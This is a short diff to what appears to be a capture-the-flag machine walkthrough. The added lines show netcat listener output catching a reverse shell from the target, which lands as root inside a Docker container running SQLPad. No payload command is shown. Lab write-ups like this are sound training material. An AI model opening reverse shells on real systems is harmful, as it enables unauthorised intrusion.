@@ -58,7 +58,14 @@ Then executed the exploit:
 This provided initial access, but I found myself in a Docker container:
 
 ```bash
+❯ rev
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on 10.10.14.149:4444
+Ncat: Connection from 10.129.190.223:54312.
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
 root@c184118df0a6:/var/lib/sqlpad# whoami
+whoami
 root
 ```
 
